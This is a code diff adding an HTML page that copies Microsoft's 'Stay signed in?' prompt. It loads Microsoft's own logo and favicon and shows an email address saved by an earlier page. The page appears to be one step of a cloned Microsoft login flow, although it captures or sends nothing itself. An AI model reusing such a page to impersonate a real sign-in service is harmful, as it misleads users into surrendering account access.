@@ -1,1 +1,43 @@
-ok
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://logincdn.msauth.net/16.000.30031.21/images/favicon.ico" />
+    <title>Stay signed in?</title>
+    <link rel="stylesheet" href="app.css" />
+</head>
+
+<body>
+    <section id="section_final">
+        <div class="auth-wrapper">
+            <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg"
+                alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <p id="displayText">a@b.com</p>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
+    </section>
+    <script>
+        window.onload = function () {
+            const storedText = localStorage.getItem('inputText');
+            if (storedText) {
+                document.getElementById('displayText').innerText = storedText;
+            }
+        }
+    </script>
+</body>
+
+</html>
